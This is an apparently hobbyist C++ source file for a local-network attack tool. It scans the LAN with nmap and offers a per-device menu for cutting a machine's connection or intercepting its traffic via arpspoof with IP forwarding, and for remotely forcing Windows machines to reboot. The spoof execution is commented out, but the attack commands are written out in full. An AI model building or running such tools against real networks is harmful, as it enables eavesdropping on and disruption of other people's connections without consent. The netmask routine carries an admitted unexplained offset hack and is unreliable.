#include "../Headers/Net.h"
#include "../Stringyst/Headers/Stringyst.h"
#include "../Menu/unicommand/Headers/unicommand.h"
#include "../Menu/TextModyst/Headers/Modyst.h"

#include <bitset>

#include <unistd.h>
#include <signal.h>
#include <sys/wait.h>

Net::Net(const string& name, const usi& connectionType, const Ipv4 &userIp, const Ipv4 &gateIp, const usi &mask):
	_name(name),
	_userIp(Ipv4(userIp)),
	_gateIp(Ipv4(gateIp)),
	_mask(mask),
	_connectionType(connectionType)
{
	//Scan network when creating
	//nmap();
}

Net::~Net()
{
	//cout << "Network " << _name << " removed" << endl;
	//_getch();
}

bool Net::nmap()
{
	//Clearing ips before scanning again
	_ips.clear();

	//writing nmap command
	stringstream nmapCommand;
	string nmapOption, sudo = "";
	
	/*if(_system("whoami").find("root") != string::npos)
	{
		sudo = "sudo ";
		nmapOption = "-sX ";
	}
	else*/
		nmapOption = "-sn ";
	
	nmapCommand << sudo << "nmap " << nmapOption << _userIp.toString(false) << "/" << _mask;// << " | grep Nmap scan";

	//Scanning network
	//cout << nmapCommand.str();
	system(clearCommand.c_str());
	cout << "[" << _name << "] " << Text::textEffect(Text::BLINK, "Scanning network...") << endl;
	string stringyMap = _system(nmapCommand.str().c_str());
	system(clearCommand.c_str());

	//Extracting devices data from nmap commandline echoes
	for(string nmapAction: lExplode("\n", stringyMap))
	{
		string deviceName, deviceIp;
		vector<string> actionWords = vExplode(" ", nmapAction);
		usi ipIndex = 5;
		bool unnamedDevice = false;

		if(actionWords.size() <= 5)
		{
			ipIndex = 4;
			unnamedDevice = true;
		}
		else
			deviceName = actionWords[4];

		
		if(
			//Scanning echo
			actionWords[0] == "Nmap"
			&& actionWords[1] == "scan"
		)
		{
			
			deviceIp = rtrim(ltrim(actionWords[ipIndex], "("), ")");

			if(unnamedDevice)
				deviceName = "Device::" + deviceIp;
			
			if(deviceIp != _gateIp.toString(false) && deviceIp != _userIp.toString(false))
			{
				//cout << deviceName << " :: " << deviceIp << " -- " << Ipv4(deviceIp, deviceName).toString(true) << endl;
				//_getch();
				_ips.push_back(Ipv4(deviceIp, deviceName));
			}
		}
	}

	//Menu filling
	_ipv4sMenu.clear();
	_ipv4sMenu.addChoice(Text::textEffect(Text::BOLD, "Rescan network"), Text::FG_GREEN);
	for(const Ipv4 &ip : _ips)
	{
		Text::Code ipEffect = ip.getAttackerPid() == 0
			? Text::FG_BLUE
			: Text::FG_YELLOW;
		stringstream pid;
		pid << ip.getAttackerPid();
		_ipv4sMenu.addChoice(Text::setMod(ipEffect) + ip.toString(true) + Text::clearMods() + pid.str());
	}
	_ipv4sMenu.addExit();

	return !_ips.empty();
}

string Net::toString() const
{
	return _name;
}

size_t Net::getIpCount() const
{
	return _ips.size();
}

void Net::displayIpv4s()
{	
	while(!_ipv4sMenu.leaving())
	{
		unsigned int
			choice = _ipv4sMenu.display("[" + _name + "] Choose the Ipv4 of a machine you wish to interact with:"),
			increment = 0;
		
		if(increment++ == choice)
		{
			nmap();
		}

		for(Ipv4 &ip : _ips)
			if (increment++ == choice)
				attackMenu(ip);
	}
}

void Net::attackMenu(Ipv4 &ip)
{
	Menu optionsMenu;

	optionsMenu.addChoice("Cut", Text::FG_LIGHT_RED);
	optionsMenu.addLocked("Spoof");//, Text::FG_LIGHT_RED);
	optionsMenu.addLocked("Shutdown");//, Text::FG_LIGHT_RED);
	//optionsMenu.addChoice("Stop attacks", Text::FG_YELLOW);
	optionsMenu.addExit();

	while (!optionsMenu.leaving())
	{
		switch (optionsMenu.display("[" + _name + "][" + ip.getLabel() + "] Choose the interaction you want to have with it:"))
		{
		case 0:
			//Cut
			arpSpoof(false, ip);
			break;

		case 1:
			//Spoof
			arpSpoof(true, ip);
			break;

		case 2:
			//Shutdown
			shutdown(ip);
			break;

		case 3:
			//Stop attacks
			stopAttacks(ip);
			break;
		}
	}
}

void Net::arpSpoof(bool forward, Ipv4& target)
{
	//Linux command [arpspoof]
	#ifdef __linux__

	if(forward && _system("whoami").find("root") == string::npos)
	{
		cout << "Spoofing requires sudo at lauching of program !" << endl;
		_getch();
		system(clearCommand.c_str());
		return;
	}

	string
		ipforwardCommand = "sudo sysctl -w net.ipv4.ip_forward=1",
		ipbackwardCommand = "sudo sysctl -w net.ipv4.ip_forward=0",
		spoofCommand = "sudo arpspoof -i " + _name + " -t " + target.toString(false) + " " + _gateIp.toString(false),
		reverseSpoofCommand = "sudo arpspoof -i " + _name + " -t " + _gateIp.toString(false) + " " + target.toString(false);

	cout << "Launching: " << endl;
	if(forward)
	{
		cout
			<< ipforwardCommand << endl
			<< spoofCommand << endl
			<< reverseSpoofCommand << endl
			<< ipbackwardCommand << endl
			<< "Leave with CTRL+C at any time if you want to" << endl
			<< "Connection will be spyed" << endl;
	}
	else
	{
		cout 
			<< spoofCommand << endl
			<< "Leave with CTRL+C at any time if you want to" << endl
			<< "Connection will be cut" << endl;
	}

	
	cout << "Push any key to run attack" << endl << endl;
	_getch();

	
	//Fork into an attecker child process
	if(target.getAttackerPid() == 0)
	{
		pid_t attackerPid = 1;//fork();
		
		if(attackerPid)
		{
			//FATHER PROCESS
			if(target.setAttackerPid(attackerPid))
			{
				cout << "Begin attack";
				_getch();
			}
			else
				cout
					<< Text::setMod(Text::BG_LIGHT_RED) << "FATAL ERROR WHILE CREATING ATTACK PROCESS."
					<< endl << "LEAVE PROGRAM ASAP" << Text::clearMods();
		}/*
		else
		{
			//HERE IN SON PROCESS
			if(forward)
				system(ipforwardCommand.c_str());

			system(spoofCommand.c_str());

			if(forward)
			{
				system(reverseSpoofCommand.c_str());
				system(ipbackwardCommand.c_str());
			}

			system(clearCommand.c_str());
			exit(0);
		}*/
	}
	else
	{
		cout << "This device is already being attacked." << endl << "Press any key to leave" << endl;
		_getch();
	}
	
	#endif
}

void Net::shutdown(const Ipv4& target) const
{
	//Linux command [shutdown]
	#if defined(_WIN64) or defined(_WIN32)
	string shutdownCommand = "shutdown -m \\ " + target.toString(false) + "-r -f";
	system(shutdownCommand.c_str());
	#else
	cout << "This feature is enabled only in windows." << endl << "Press any key to leave" << endl;
	_getch();
	#endif
}

void Net::killChilds()
{
	for(Ipv4& ip: _ips)
		stopAttacks(ip);
}

void Net::stopAttacks(Ipv4& target)
{
	if(target.getAttackerPid() == 0)
	{
		cout 
			<< "No attacks running."
			<< endl << "Press any key to leave";
		
		_getch();
		return;
	}

	//Clear screen
	system(clearCommand.c_str());

	//Tell to child to end attack process
	//kill(target.getAttackerPid(), SIGINT);

	//Waiting for process' end
	cout << Text::textEffect(Text::BLINK, "Stopping attack...") << endl;
	//wait(NULL);

	//Clearing target's attacker pid
	target.setAttackerPid(0);
}

usi Net::maskToUsi(const string &stringyMask)
{
	vector<usi> explodedMask = Ipv4::readIp(stringyMask);

	return maskToUsi(
		explodedMask[0],
		explodedMask[1],
		explodedMask[2],
		explodedMask[3]
	);
}

usi Net::maskToUsi(const usi &word1, const usi &word2, const usi &word3, const usi &word4)
{
	//Mask's bits consist in 4 bytes
	vector<bitset<8>> words =
	{
		bitset<8>(word1),
		bitset<8>(word2),
		bitset<8>(word3),
		bitset<8>(word4)
	};
	
	//Counting bits
	usi sIndex, bIndex, ret = 0;
	for(sIndex = 0; sIndex < 4; sIndex++)
		//For each byte
		for(bIndex = 7; bIndex > 0; bIndex--)
			//For each bit
			if(words[sIndex].test(bIndex) == true)
				//Sum
				ret++;
			else
				//Return
				//I don't know why, but an offset of -3 has to be compensated
				return ret + 3;

	return 64;
}